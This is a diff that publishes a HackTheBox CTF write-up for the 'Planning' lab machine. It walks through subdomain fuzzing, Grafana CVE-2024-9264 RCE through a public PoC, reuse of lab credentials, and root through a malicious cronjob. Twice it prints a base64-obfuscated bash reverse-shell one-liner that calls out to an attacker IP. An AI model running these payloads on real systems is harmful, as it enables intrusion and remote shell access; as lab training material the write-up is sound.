@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Planning - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Planning.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Planning machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Planning machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Planning, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,85 @@
         <h1 class="writeup-title">Planning</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">September 13, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="lanning" src="../images/Planning/pwned.png" /></p>
-<p>Planning  is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Planning retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Planning/pwned.png" /></p>
+<p>Planning was an easy-difficulty Linux box that began with subdomain enumeration to discover a Grafana instance running version 11.0.0.
+Using provided admin credentials, I successfully authenticated to the Grafana interface and exploited CVE-2024-9264, an authenticated remote code execution vulnerability in the experimental SQL Expressions feature.
+This vulnerability allowed me to execute arbitrary commands through insufficiently sanitized DuckDB queries, resulting in a root shell within the Grafana container.</p>
+<p>Post-exploitation enumeration of the container's environment variables revealed hardcoded credentials for a user named Enzo.
+These credentials provided SSH access to the underlying host system, establishing a foothold outside the containerized environment.
+With limited privileges as Enzo, I conducted port enumeration and discovered an internal web service listening on port 8000.</p>
+<p>Further system enumeration using LinPEAS revealed a critical file at /opt/crontabs/crontab.db containing JSON data with embedded credentials.
+These credentials (root:P4ssw0rdS0pRi0T3c) granted access to the internal crontab management interface on port 8000.
+By leveraging this web-based cron management system, I created a malicious scheduled task containing a Base64-encoded reverse shell payload.
+Executing the crafted cronjob provided an immediate root shell on the host system, achieving complete system compromise through a combination of container escape techniques and privilege escalation via insecure cron management.</p>
+<p><img alt="nmap" src="../images/Planning/nmap.png" /></p>
+<p>Initial nmap scan reveals 2 ports. SSH on 22 and HTTP on 80.</p>
+<h1>User flag</h1>
+<p><img alt="website" src="../images/Planning/website.png" /></p>
+<p>This looks like an online education website. While I was given credentials for the user admin, it seems like this website does not have a login feature.</p>
+<h2>Discovering the Grafana subdomain</h2>
+<p>I fuzzed the website for directories and subdomains using dirsearch and ffuf.</p>
+<p>There were two interesting endpoints I could reach, and there was a single subdomain found. I had to use a few different wordlists to find this subdomain.</p>
+<p><code>ffuf -u http://planning.htb -H 'Host: FUZZ.planning.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-spanish.txt -fs 178</code></p>
+<p><img alt="fuzz" src="../images/Planning/fuzz.png" /></p>
+<p>Grafana is an open-source analytics and visualization platform used to monitor, analyze, and visualize data from various sources. I will visit the subdomain now, keeping in mind that I have valid credentials for the user admin.</p>
+<p><img alt="grafana" src="../images/Planning/grafana.png" /></p>
+<p>The login page reveals the version of this Grafana instance, which is <code>11.0.0</code>. I will log in to Grafana with the provided credentials.</p>
+<p><img alt="login" src="../images/Planning/login.png" /></p>
+<p>I have successfully logged in to Grafana as the administrator.</p>
+<h2>Abusing CVE-2024-9264 in Grafana</h2>
+<p>Since I have the Grafana version, I will search for vulnerabilities.</p>
+<p>I found CVE-2024-9264, which is an authenticated RCE via the experimental SQL Expressions feature. Due to insufficient sanitization of queries containing user input, it is possible to achieve RCE using any account with at least the VIEWER permission. Since I'm an admin here, this will not be an issue.</p>
+<p><code>https://grafana.com/security/security-advisories/cve-2024-9264/</code>                                                                                                                                                                        <br />
+<code>https://github.com/nollium/CVE-2024-9264</code>                                                                                                                                                                                                 </p>
+<p>I'll clone this PoC script onto my machine. The only requirement, aside from a valid user, is that the DuckDB binary must be installed and present in Grafana's PATH.</p>
+<p>I couldn't find a way to confirm the presence of DuckDB, so I'll quickly check whether this Grafana instance is vulnerable.</p>
+<p><img alt="work" src="../images/Planning/work.png" />                                                                                                                                                                                                                          </p>
+<p>This confirms the vulnerability. I can read files on the box, but I would prefer to get an actual shell. Since this worked, there is a high chance that RCE will be possible too.</p>
+<p><code>python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjQvOTAwMSAgMD4mMQo= | base64 -d | bash" http://grafana.planning.htb</code></p>
+<p>I base64-encoded a bash reverse shell, then piped the decoded command directly to bash. This can be done with curl and a python server, too.</p>
+<p>The exploit hangs while running the DuckDB query as my listener captures the shell.</p>
+<p><img alt="container" src="../images/Planning/container.png" /></p>
+<h2>Reading the environmental variables of the container</h2>
+<p>The fact that I got root directly from RCE, coupled with the hostname consisting of random letters and numbers, makes me think that I've landed in a container.</p>
+<p>I'll take a look at a few things by hand. If nothing comes up, I will use LinPEAS to gather more information.</p>
+<p>Environmental variables often contain sensitive data. I can get a list of all assigned variables by using the env command.</p>
+<p><img alt="env" src="../images/Planning/env.png" /></p>
+<p>There are credentials for the user Enzo set in the environmental variables. This user doesn't exist in the container, so I'll try to SSH into the main machine as them.</p>
+<p><img alt="user" src="../images/Planning/user.png" /></p>
+<h1>Root flag</h1>
+<p>Enzo cannot run sudo on the box. I looked at active ports and found something interesting.</p>
+<p><img alt="ports" src="../images/Planning/ports.png" /></p>
+<p>Port 8000 is listed as active, so I'll forward it to my box using SSH.</p>
+<p><img alt="anotherlogin" src="../images/Planning/anotherlogin.png" /></p>
+<p>It required credentials, but none of the ones I've gathered so far were accepted.</p>
+<h2>Discovering a new set of credentials</h2>
+<p>I ran LinPEAS on the box, and it discovered an unusual file.</p>
+<p><img alt="linpeas" src="../images/Planning/linpeas.png" /></p>
+<p><code>/opt/crontabs/crontab.db</code> is a file that contains raw JSON data, which means that I should be able to read it.</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Grafana backup&quot;</span><span class="p">,</span><span class="s2">&quot;command&quot;</span><span class="p">:</span><span class="s2">&quot;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar &amp;&amp; /usr/bin/gzip /var/backups/grafana.tar &amp;&amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &amp;&amp; rm /var/backups/grafana.tar.gz&quot;</span><span class="p">,</span><span class="s2">&quot;schedule&quot;</span><span class="p">:</span><span class="s2">&quot;@daily&quot;</span><span class="p">,</span><span class="s2">&quot;stopped&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)&quot;</span><span class="p">,</span><span class="s2">&quot;logging&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">,</span><span class="s2">&quot;mailing&quot;</span><span class="p">:{},</span><span class="s2">&quot;created&quot;</span><span class="p">:</span><span class="mi">1740774983276</span><span class="p">,</span><span class="s2">&quot;saved&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span><span class="s2">&quot;GTI22PpoJNtRKg0W&quot;</span><span class="p">}</span>
+<span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Cleanup&quot;</span><span class="p">,</span><span class="s2">&quot;command&quot;</span><span class="p">:</span><span class="s2">&quot;/root/scripts/cleanup.sh&quot;</span><span class="p">,</span><span class="s2">&quot;schedule&quot;</span><span class="p">:</span><span class="s2">&quot;* * * * *&quot;</span><span class="p">,</span><span class="s2">&quot;stopped&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)&quot;</span><span class="p">,</span><span class="s2">&quot;logging&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">,</span><span class="s2">&quot;mailing&quot;</span><span class="p">:{},</span><span class="s2">&quot;created&quot;</span><span class="p">:</span><span class="mi">1740849309992</span><span class="p">,</span><span class="s2">&quot;saved&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span><span class="s2">&quot;gNIRXh1WIc9K7BYX&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<p>There is a password in this DB file. Aside from that, there is a command that creates a backup of the Grafana container daily.</p>
+<p>While I don’t have a valid username for the login prompt, root is a common one for internal services, so I’ll test it first.</p>
+<p><code>root | P4ssw0rdS0pRi0T3c</code></p>
+<p>These credentials were accepted on the local website.</p>
+<p><img alt="cron" src="../images/Planning/cron.png" /></p>
+<h2>Creating a malicious cronjob via the Crontab UI</h2>
+<p>I can create cronjobs that will be run on the system as root. I'll copy the command used in the first step.</p>
+<p><code>echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjQvOTAwMSAgMD4mMQo= | base64 -d | bash</code></p>
+<p>And I'll use it to create a new root reverse shell cronjob.</p>
+<p><img alt="revshel" src="../images/Planning/revshell.png" /></p>
+<p>I set the schedule to yearly, so that it won't execute on its own. I can run it on demand by clicking the <code>run now</code> button.</p>
+<p><img alt="root" src="../images/Planning/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
